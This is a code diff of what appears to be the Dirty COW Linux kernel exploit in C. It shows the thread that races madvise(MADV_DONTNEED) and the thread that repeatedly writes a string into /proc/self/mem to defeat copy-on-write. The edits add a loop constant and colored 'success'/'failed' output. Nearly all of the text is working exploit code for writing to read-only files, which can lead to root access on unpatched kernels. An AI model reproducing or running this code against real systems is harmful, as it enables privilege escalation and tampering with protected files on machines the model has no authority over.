@@ -21,6 +21,8 @@ m00000000000000000
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
+#define ESC          "\033"
+#define LOOP 100000000
  
 void *map;
 int f;
@@ -41,7 +43,11 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 */
     c+=madvise(map,100,MADV_DONTNEED);
   }
-  printf("madvise %d\n\n",c);
+  if (c == 0) {
+    printf (ESC "[33mmadvise success" ESC "[0m\n");
+  }else {
+    printf (ESC "[31mmadvise failed" ESC "[0m\n");
+  }
 }
  
 void *procselfmemThread(void *arg)
@@ -56,15 +62,19 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
 >  writable on Red Hat Enterprise Linux 5 and 6.
 */
   int f=open("/proc/self/mem",O_RDWR);
-  int i,c=0;
-  for(i=0;i<100000000;i++) {
-/*
-You have to reset the file pointer to the memory position.
-*/
+  int i, c = 0;
+  for(i=0;i<LOOP;i++) {
+    /*
+    * You have to reset the file pointer to the memory position.
+    **/
     lseek(f,map,SEEK_SET);
     c+=write(f,str,strlen(str));
   }
-  printf("procselfmem %d\n\n", c);
+  if (c == LOOP * strlen(str)) {
+    printf (ESC "[33mprocself mem success" ESC "[0m\n");
+  }else {
+    printf (ESC "[31mprocself mem failed" ESC "[0m\n");
+  }
 }
  
  
